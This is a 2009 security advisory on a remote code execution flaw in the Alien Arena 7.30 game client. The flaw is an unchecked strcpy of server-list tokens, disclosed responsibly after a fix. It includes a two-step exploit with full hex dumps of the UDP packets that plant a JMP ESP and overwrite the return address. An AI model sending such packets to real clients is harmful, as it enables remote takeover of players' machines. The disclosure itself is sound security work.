@@ -1,0 +1,255 @@
+
+Date: Wed, 21 Oct 2009 13:59:58 -0600
+From: jason@...software.com
+To: bugtraq@...urityfocus.com
+Subject: Anonymous Remote Arbitrary Code Execution in Alien Arena 7.30
+
+Anonymous Remote Arbitrary Code Execution in Alien Arena 7.30
+-------------------------------------------------------------
+
+October 21st, 2009
+
+=======
+Summary
+=======
+Name: Anonymous Remote Arbitrary Code Execution in Alien Arena 7.30
+Release Date: October 21st, 2009
+Discoverer: Jason Geffner
+Vendor: COR Entertainment
+Systems Affected: Alien Arena 7.30
+Risk: Very High
+Status: Published
+Formatted Advisory: http://www.ngssoftware.com/brochures/Anonymous.Remote.Arbitrary.Code.Execution.in.Alien.Arena.pdf
+
+
+============
+Introduction
+============
+This paper discusses how an anonymous remote attacker can execute arbitrary
+code on the computers of Alien Arena's networked players. This vulnerability
+was responsibly disclosed to the authors of the game and this advisory was not
+released until a fixed build of the game was released.
+
+
+==========
+Background
+==========
+Alien Arena is a popular[1] free open-source FPS game for Windows, Mac, and
+Linux. It has had a history of security vulnerabilities[2] since its initial
+release in 2004.
+
+
+========
+Timeline
+========
+06/19/09  Alien Arena 7.30 released
+06/21/09  Anonymous remote arbitrary code execution vulnerability discovered
+06/22/09  Request for contact sent to Alien Arena's developers
+06/23/09  Detailed vulnerability report responsibly disclosed to Lead Developer
+            of Alien Arena
+06/23/09  Security vulnerability "fixed" (Revision 1390)[3]
+06/23/09  Broken "fix" identified and responsibly disclosed to Lead Developer
+            of Alien Arena
+06/23/09  Security vulnerability "fix" fixed (Revision 1391)[3]
+10/08/09  Alien Arena 7.31 released, incorporating fixes above
+10/16/09  Advisory written
+10/21/09  Advisory released
+
+
+=============
+Vulnerability
+=============
+When the game client requests a list of network games to join, it sends a UDP
+query to master.corservers.com. This server responds to the client via UDP with
+a list of known game servers. The client then sends a UDP query to each of the
+listed game servers, asking each for its description. The client's parsing of
+the servers' responses is vulnerable to a buffer overflow attack.
+
+The client is designed to listen for incoming UDP packets from
+master.corservers.com and from the game servers on port 27901, however it will
+accept and parse UDP packets from any IP address even if the client did not
+initiate a UDP conversation with that given IP address. As such, an attacker
+can send a malformed UDP packet from any source IP address; they need not know
+a valid game server's IP address to exploit this buffer overflow vulnerability.
+
+When the client receives a UDP packet on port 27901 that specifies a server's
+description (the server-to-client "print" message), it calls the function
+M_AddToServerList(...)in \client\menu.c to tokenize the rest of the UDP packet
+(status_string):
+
+  |  void M_AddToServerList (netadr_t adr, char *status_string)
+  |  {
+  |      char *rLine;
+  |      char *token;
+  |      char lasttoken[256];
+  |      char seps[]   = "\\";
+  |  ...
+  |      //parse it
+  |
+  |      result = strlen(status_string);
+  |
+  |      //server info - we may revisit this
+  |      rLine = GetLine (&status_string, &result);
+  |  ...
+  |      /* Establish string and get the first token: */
+  |      token = strtok( rLine, seps );
+  |      while( token != NULL ) {
+  |          /* While there are tokens in "string" */
+  |          if (!_stricmp (lasttoken, "admin"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "website"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "fraglimit"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "timelimit"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "version"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "mapname"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "hostname"))
+  |  ...
+  |          else if (!_stricmp (lasttoken, "maxclients"))
+  |  ...
+  |          /* Get next token: */
+  |          strcpy (lasttoken, token);
+  |    ...
+  
+Note that the lasttoken buffer is 256 bytes long. As such, if an attacker
+supplies a token longer than 256 bytes then the strcpy(...) function above will
+overwrite the return address for the M_AddToServerList(...) function.
+
+
+====================
+Exploit, Step 1 of 2
+====================
+To properly orchestrate an attack and make it agnostic of the version of
+Windows, an attacker would need to know a reliable return address that they can
+use that satisfies the following conditions:
+  1.    This address is constant across all versions of Windows.
+  2.    The attacker can write code and data to this address.
+  3.    Code at this address is readable and executable.
+
+A global variable in Alien Arena's executable would be ideal for this situation
+since the Alien Arena developers did not link this executable for ASLR or DEP.
+Since it's a global variable and ASLR is disabled, the address will remain
+constant across all versions of Windows for this version of Alien Arena, and
+since DEP is not enabled, its content is executable.
+
+When the client receives a UDP packet on port 27901 that specifies a list of
+game servers (the server-to-client "servers" message), it calls the function
+CL_ParseGetServersResponse() in \client\cl_main.c to parse the rest of the UDP
+packet (net_message):
+
+  |  void CL_ParseGetServersResponse()
+  |  {
+  |  ...
+  |      byte        addr[4];
+  |
+  |      MSG_BeginReading (&net_message);
+  |      MSG_ReadLong (&net_message);    // skip the -1
+  |  ...
+  |      numServers = 0;
+  |  ...
+  |      while( net_message.readcount +6 <= net_message.cursize ) {
+  |          MSG_ReadData( &net_message, addr, 4 );
+  |          servers[numServers].port = MSG_ReadShort( &net_message );
+  |  ...
+
+The following UDP data can be sent from any IP address to a client on port
+27901 to store the "port" number 0xE4FF in the global variable servers[1].port,
+which in Alien Arena 7.30 for Windows is located at the static address
+0x05BE9734. (N.B., servers[0].port can't be used because it is at static
+address 0x05BE8F00 and the null-byte in this address can't be used in the
+"print" message).
+
+00000000 FF FF FF FF 73 65 72 76 65 72 73 20 7F 00 00 01 ....servers ....
+00000010 00 00 00 00 00 00 FF E4                         ........        
+
+Note that 0xFF 0xE4 is the machine code for "JMP ESP". After sending the UDP
+data above to the client, the attacker now knows that the assembly instruction
+"JMP ESP" is located at static address 0x05BE9734.
+
+
+====================
+Exploit, Step 2 of 2
+====================
+The attacker could then send a UDP packet from any IP address to the client
+consisting of the following data. This message overflows the strcpy(...)
+function in M_AddToServerList(...) above and overwrites the return address with
+the address of the "JMP ESP" instruction above (0x05BE9734). The highlighted
+NOPs are the shellcode that gets executed. Note that those 4 NOPs can be
+replaced with quite a bit of code -- the data portion of the UDP packet can be
+up to 2800 bytes, more than enough to do whatever an attacker would want to do.
+The only restriction is no null-bytes, but that obviously wouldn't be a problem
+if an attacker used an encoded payload.
+
+00000000 FF FF FF FF 70 72 69 6E 74 0A 5C 41 41 41 41 41 ....print.\AAAAA
+00000010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000020 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000030 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000040 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000050 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000060 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000070 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000080 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000090 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000A0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000B0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000C0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000D0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000E0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000F0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000100 41 41 41 41 41 41 41 41 41 41 41 34 97 BE 05 90 AAAAAAAAAAA4....
+00000110 90 90 90 0A 20 41 20 41                         .... A A        
+
+
+==========
+Conclusion
+==========
+It is clear that a remote attacker can anonymously execute arbitrary code on
+clients' systems by sending 2 maliciously crafted UDP packets.
+
+It should be noted that there are likely other vulnerabilities remaining in
+this codebase. NGS did not perform a comprehensive security review of Alien
+Arena.
+
+
+============
+Observations
+============
+Despite the common perception in the open-source community that "given enough
+eyeballs, all bugs are shallow,"[4] open-source software is still plagued by
+high-impact security vulnerabilities. For this mantra to hold, not only are
+"enough eyeballs" required, but the eyeballs should be those of well-trained
+security professionals.
+
+Security best-practices such as adherence to the Security Development
+Lifecycle[5] are also critical when designing and developing software. It is
+worth noting that even with the code-based vulnerability identified in this
+advisory, a defense-in-depth approach of using ASLR and/or DEP would have
+deterred exploitation if enabled.
+
+
+===============
+Fix Information
+===============
+This issue has now been resolved. Alien Arena 7.31 can be downloaded from:
+http://icculus.org/alienarena/rpa/aquire.html
+
+
+==========
+References
+==========
+[1] http://games.slashdot.org/story/09/06/21/1336213
+[2] http://www.securityfocus.com/archive/1/426984
+[3] http://icculus.org/alienarena/changelogs/7.31.txt
+[4] http://en.wikipedia.org/wiki/Linus'_Law
+[5] http://msdn.microsoft.com/en-us/library/ms995349.aspx
+
+
+NGSSoftware Insight Security Research
+http://www.ngssoftware.com/
+http://www.databasesecurity.com/
+http://www.nextgenss.com/
++44(0)208 401 0070
